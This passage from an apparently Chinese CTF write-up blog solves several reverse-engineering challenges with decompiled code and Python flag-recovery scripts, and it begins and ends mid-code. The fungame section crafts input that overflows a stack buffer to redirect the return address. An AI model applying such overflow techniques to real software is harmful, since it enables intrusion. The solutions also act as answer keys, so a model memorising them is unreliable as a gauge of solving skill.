self.r0</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">vm = VM(opcodes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    vm.memory[i] = x[i]</span><br><span class="line"></span><br><span class="line">vm.run()</span><br><span class="line"></span><br><span class="line">cmp_data = [<span class="number">0x46</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x7B</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x66</span>, <span class="number">0x4D</span>, <span class="number">0x74</span>, <span class="number">0x7E</span>, <span class="number">0x73</span>, <span class="number">0x75</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    s.add(vm.memory[i+<span class="number">32</span>] == cmp_data[i])</span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    flag += <span class="built_in">bytes</span>([m[i].as_long()])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到假flag</p><p>根据提示，对<code>memory</code>进行交叉引用查找找到一个根本没调用的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_F00()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  unsigned __int64 v2; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; flag_len - 1 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( memory[i] != byte_202020[i] )</span><br><span class="line">      exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及在opcodes下面又得到一串opcodes,</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211018162413492.png" alt="image-20211018162413492"></p><p>最终得到真flag解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcodes = [<span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">vm = VM(opcodes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    vm.memory[i] = x[i]</span><br><span class="line"></span><br><span class="line">vm.run()</span><br><span class="line"></span><br><span class="line">cmp_data = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp_data)):</span><br><span class="line">    s.add(vm.memory[i] == cmp_data[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    flag += <span class="built_in">bytes</span>([m[i].as_long()])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-fungame"><a href="#ACTF新生赛2020-fungame" class="headerlink" title="[ACTF新生赛2020]fungame"></a>[ACTF新生赛2020]fungame</h3><p>flag分为两部分, 第一部分是简单的异或</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_401340</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> i; <span class="comment">// [esp+1Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)a1[i] ^ (<span class="keyword">unsigned</span> __int8)y1[i]) != y2[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是flag提交不对，往后看有个栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4013BA</span><span class="params">(<span class="keyword">char</span> *Source)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Destination[<span class="number">12</span>]; <span class="comment">// [esp+1Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Source);                  <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="built_in">strcpy</span>(x, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对x进行交叉引用查询</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_40233D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Str2[<span class="number">13</span>]; <span class="comment">// [esp+13h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Str1[<span class="number">16</span>]; <span class="comment">// [esp+20h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">12</span>]; <span class="comment">// [esp+30h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input again:&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(Str2, <span class="string">&quot;YTFzMF9wV24=&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str1));</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  sub_402421((<span class="keyword">int</span>)Str, v3, (<span class="keyword">int</span>)Str1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, Str2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s%s&quot;</span>, x, Str);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则我们的输入需要跳到第二个校验函数, 根据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000C Destination     db 12 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 Source          dd ?   </span><br></pre></td></tr></table></figure><p>我们需要覆盖<code>r</code>, 则需要往后多输入<code>0x3d,0x23,0x40</code>（小端序)</p><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">y2 = [<span class="number">0x71</span>, <span class="number">0x04</span>, <span class="number">0x61</span>, <span class="number">0x58</span>, <span class="number">0x27</span>, <span class="number">0x1E</span>, <span class="number">0x4B</span>, <span class="number">0x22</span>, <span class="number">0x5E</span>, <span class="number">0x64</span>, <span class="number">0x03</span>, <span class="number">0x26</span>, <span class="number">0x5E</span>, <span class="number">0x17</span>, <span class="number">0x3C</span>, <span class="number">0x7A</span>]</span><br><span class="line">y1 = [<span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0x3E</span>, <span class="number">0x69</span>, <span class="number">0x54</span>, <span class="number">0x41</span>, <span class="number">0x18</span>, <span class="number">0x4D</span>, <span class="number">0x6E</span>, <span class="number">0x3B</span>, <span class="number">0x65</span>, <span class="number">0x53</span>, <span class="number">0x30</span>, <span class="number">0x79</span>, <span class="number">0x45</span>, <span class="number">0x5B</span>]</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(y1, y2):</span><br><span class="line">    s.append(i ^ j)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">b&quot;YTFzMF9wV24=&quot;</span></span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(s + [<span class="number">0x3d</span>,<span class="number">0x23</span>,<span class="number">0x40</span>]) + plain</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-Baby-Obfuscation"><a href="#NPUCTF2020-Baby-Obfuscation" class="headerlink" title="[NPUCTF2020]Baby Obfuscation"></a>[NPUCTF2020]Baby Obfuscation</h3><p>ida打开看到主要函数， 分析一下使用的函数</p><h4 id="F0X1"><a href="#F0X1" class="headerlink" title="F0X1"></a>F0X1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">F0X1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( b )</span><br><span class="line">    <span class="keyword">return</span> F0X1(b, a % b);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>欧几里得算法求最大公约数</p><h4 id="F0X2"><a href="#F0X2" class="headerlink" title="F0X2"></a>F0X2</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">F0X2</span><span class="params">(<span class="keyword">bool</span> a, <span class="keyword">bool</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a == b &amp;&amp; !a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于与， 两边同时为1时才返回1</p><h4 id="F0X3"><a href="#F0X3" class="headerlink" title="F0X3"></a>F0X3</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">F0X3</span><span class="params">(<span class="keyword">bool</span> a, <span class="keyword">bool</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">bool</span> v3; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v2 = F0X2(b, b);</span><br><span class="line">  v3 = F0X2(a, a);</span><br><span class="line">  <span class="keyword">return</span> F0X2(v3, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与F0X2同理</p><h4 id="F0X4"><a href="#F0X4" class="headerlink" title="F0X4"></a>F0X4</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl F0X4(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">  return ~(~a + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于<code>a - b</code></p><h4 id="F0X5"><a href="#F0X5" class="headerlink" title="F0X5"></a>F0X5</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">F0X5</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ans; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ans = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( b )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (b &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      ans *= a;</span><br><span class="line">    a *= a;</span><br><span class="line">    b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于 a^b (这里^是次方的意思)</p><h4 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h4><p>则分析函数可得主要加密就红框这三条</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211018173703390.png" alt="image-20211018173703390"></p><p>实际上就是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s[i] = <span class="built_in">input</span>[i] - A0X4[(i - <span class="number">1</span>) % <span class="number">4</span>]</span><br><span class="line">s[i] ^= A0X4[(i - <span class="number">1</span>) % <span class="number">4</span>]</span><br><span class="line">s[i] *= <span class="number">10</span></span><br></pre></td></tr></table></figure><p>解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A0X6 = [<span class="number">0x0</span>, <span class="number">0x00001E79</span>, <span class="number">0x00001E79</span>, <span class="number">0x00002135</span>, <span class="number">0x0000170D</span>, <span class="number">0x00001F41</span>, <span class="number">0x00001901</span>, <span class="number">0x00002CED</span>, <span class="number">0x000011F9</span>, <span class="number">0x00002649</span>, <span class="number">0x00002581</span>, <span class="number">0x00002DB5</span>, <span class="number">0x000014B5</span>, <span class="number">0x000025E5</span>, <span class="number">0x00002A31</span>, <span class="number">0x000030D5</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F0X4</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ~(~a + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">A0X = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> A0X6:</span><br><span class="line">   A0X.append(F0X4(i, <span class="number">1</span>) // <span class="number">10</span>) </span><br><span class="line"><span class="built_in">print</span>(A0X)</span><br><span class="line"></span><br><span class="line">A0X4=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(A0X)):</span><br><span class="line">    A0X[i] //= <span class="number">10</span></span><br><span class="line">    A0X[i] ^= A0X4[(i - <span class="number">1</span>) % <span class="number">4</span>]</span><br><span class="line">    A0X[i] += A0X4[(i - <span class="number">1</span>) % <span class="number">4</span>]</span><br><span class="line">    A0X[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(A0X[<span class="number">1</span>:]))</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-blink"><a href="#BSidesSF2019-blink" class="headerlink" title="[BSidesSF2019]blink"></a>[BSidesSF2019]blink</h3><p>jadx打开，看到一个图片</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211018180801689.png" alt="image-20211018180801689"></p><p>写脚本解析一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = base64.b64decode(<span class="string">&quot;&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;s.jpeg&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(s)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211018181215405.png" alt="image-20211018181215405"></p><h3 id="SUCTF2019-hardcpp"><a href="#SUCTF2019-hardcpp" class="headerlink" title="[SUCTF2019]hardcpp"></a>[SUCTF2019]hardcpp</h3><p><a href="https://lantern.cool/wp-games-2019suctf/">2019 SUCTF | Lantern’s 小站</a></p><h3 id="NPUCTF2020-BasicASM"><a href="#NPUCTF2020-BasicASM" class="headerlink" title="[NPUCTF2020]BasicASM"></a>[NPUCTF2020]BasicASM</h3><p>根据分析主要就干了如下操作(python实现)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line"><span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(flag[i] ^ <span class="number">0x42</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(flag[i])[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d&quot;</span>)</span><br><span class="line">flag = []</span><br><span class="line">sign = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">        flag.append(i)</span><br><span class="line">        sign = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag.append(i ^ <span class="number">0x42</span>)</span><br><span class="line">        sign = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Shit"><a href="#MRCTF2020-Shit" class="headerlink" title="[MRCTF2020]Shit"></a>[MRCTF2020]Shit</h3><p>既然给了源码，那就偷下懒吧, 看到decode</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> k=<span class="number">0</span>,bk=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">5</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">0</span>)</span><br><span class="line">ks[i]^=ks[i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i+=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">k=ks[i/<span class="number">4</span>];</span><br><span class="line">k=(<span class="number">1</span>&lt;&lt;key[i/<span class="number">4</span>])^k;</span><br><span class="line">k=((k&gt;&gt;<span class="number">16</span>)) | ((~(k&lt;&lt;<span class="number">16</span>))&amp;<span class="number">0xffff0000</span>);</span><br><span class="line">k=((k&lt;&lt;key[i/<span class="number">4</span>])) | (k&gt;&gt;(<span class="number">32</span>-key[i/<span class="number">4</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%X\n&quot;</span>,k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中key为生成出来的，直接写个程序跑一下genKey即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">100</span>],c=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> key[<span class="number">7</span>]=&#123;<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;w&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span 